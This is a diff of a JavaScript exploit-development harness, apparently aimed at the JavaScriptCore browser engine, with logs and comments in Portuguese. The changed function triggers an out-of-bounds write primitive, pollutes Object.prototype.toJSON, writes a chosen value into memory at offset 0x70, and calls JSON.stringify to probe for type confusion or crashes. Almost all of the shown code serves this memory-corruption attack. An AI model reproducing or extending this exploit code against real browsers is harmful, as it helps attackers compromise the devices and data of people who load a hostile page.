@@ -7,27 +7,28 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const CRITICAL_PARAMS_FOR_TYPEERROR_REPRO = {
-    victim_ab_size: 64,
-    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
-    value_to_write: 0xFFFFFFFF,
-    bytes_to_write_for_corruption: 4,
-    ppKey: 'toJSON',
-    // description será passado pela função chamadora
-};
-
 // Contador global para ser usado pelas variantes de toJSON definidas em runAllAdvancedTestsS3.mjs
 export let current_toJSON_call_count_for_TypeError_test = 0;
 
 export async function executeFocusedTestForTypeError(
     testDescription,
-    toJSONFunctionToUse // A variante da função toJSON a ser testada
+    toJSONFunctionToUse, // A variante da função toJSON a ser testada
+    valueToWriteOOB // O valor a ser escrito via OOB
 ) {
     const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
     logS3(`--- Iniciando Teste Focado para TypeError: ${testDescription} ---`, "test", FNAME);
+    logS3(`    Valor OOB a ser escrito: ${toHex(valueToWriteOOB)}`, "info", FNAME);
     document.title = `Iniciando: ${testDescription}`;
 
     current_toJSON_call_count_for_TypeError_test = 0; // Resetar para cada teste
+
+    // Usar os parâmetros de corrupção definidos globalmente ou passá-los se necessário
+    const corruption_offset_val = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
+    const bytes_to_write_val = 4;
+    const victim_ab_size_val = 64;
+    const ppKey_val = 'toJSON';
+
+
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
         logS3("Falha OOB Setup.", "error", FNAME);
@@ -36,10 +37,10 @@ export async function executeFocusedTestForTypeError(
     }
     document.title = "OOB OK - " + FNAME;
 
-    let victim_ab = new ArrayBuffer(CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.victim_ab_size);
-    logS3(`ArrayBuffer vítima (${CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.victim_ab_size} bytes) recriado.`, "info", FNAME);
+    let victim_ab = new ArrayBuffer(victim_ab_size_val);
+    logS3(`ArrayBuffer vítima (${victim_ab_size_val} bytes) recriado.`, "info", FNAME);
 
-    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.ppKey);
+    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
     let pollutionApplied = false;
     let stepReached = "antes_pp";
     let potentiallyCrashed = true; 
@@ -48,9 +49,9 @@ export async function executeFocusedTestForTypeError(
 
     try {
         stepReached = "aplicando_pp";
-        logS3(`Poluindo Object.prototype.${CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.ppKey} com ${testDescription}...`, "info", FNAME);
+        logS3(`Poluindo Object.prototype.${ppKey_val} com ${testDescription}...`, "info", FNAME);
         document.title = `Aplicando PP (${testDescription})`;
-        Object.defineProperty(Object.prototype, CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.ppKey, {
+        Object.defineProperty(Object.prototype, ppKey_val, {
             value: toJSONFunctionToUse,
             writable: true, configurable: true, enumerable: false
         });
@@ -60,9 +61,9 @@ export async function executeFocusedTestForTypeError(
         document.title = `PP OK (${testDescription})`;
 
         stepReached = "antes_escrita_oob";
-        logS3(`CORRUPÇÃO: ${toHex(CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.value_to_write)} @ ${toHex(CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.corruption_offset)}`, "warn", FNAME);
+        logS3(`CORRUPÇÃO: ${toHex(valueToWriteOOB)} @ ${toHex(corruption_offset_val)}`, "warn", FNAME);
         document.title = `Antes OOB Write (${testDescription})`;
-        oob_write_absolute(CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.corruption_offset, CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.value_to_write, CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.bytes_to_write_for_corruption);
+        oob_write_absolute(corruption_offset_val, valueToWriteOOB, bytes_to_write_val);
         logS3("Escrita OOB feita.", "info", FNAME);
         stepReached = "apos_escrita_oob";
         document.title = `Após OOB Write (${testDescription})`;
@@ -85,7 +86,7 @@ export async function executeFocusedTestForTypeError(
             errorCaptured = e;
             document.title = `ERRO Strfy (${e.name}) - ${testDescription}`;
             logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}. (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "critical", FNAME);
-            if (e.stack) logS3(`   Stack: ${e.stack}`, "error"); // Logar stack trace se disponível
+            if (e.stack) logS3(`   Stack: ${e.stack}`, "error"); 
             console.error(`JSON.stringify ERROR (${testDescription}):`, e);
         }
     } catch (mainError) {
@@ -97,8 +98,8 @@ export async function executeFocusedTestForTypeError(
         console.error("Main test error:", mainError);
     } finally {
         if (pollutionApplied) {
-            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.ppKey, originalToJSONDescriptor);
-            else delete Object.prototype[CRITICAL_PARAMS_FOR_TYPEERROR_REPRO.ppKey];
+            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
+            else delete Object.prototype[ppKey_val];
         }
         clearOOBEnvironment();
         logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}.`, "info", FNAME);
@@ -110,8 +111,8 @@ export async function executeFocusedTestForTypeError(
     logS3(`--- Teste Focado para TypeError Concluído: ${testDescription} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}) ---`, "test", FNAME);
     if (!potentiallyCrashed && !errorCaptured) {
         document.title = `Teste Concluído OK - ${testDescription}`;
-    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { // Se o título do erro não foi setado pelo catch interno
-        document.title = `ERRO OCORREU - ${testDescription}`;
+    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
+        document.title = `ERRO OCORREU (${errorCaptured.name}) - ${testDescription}`;
     }
     return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed };
 }
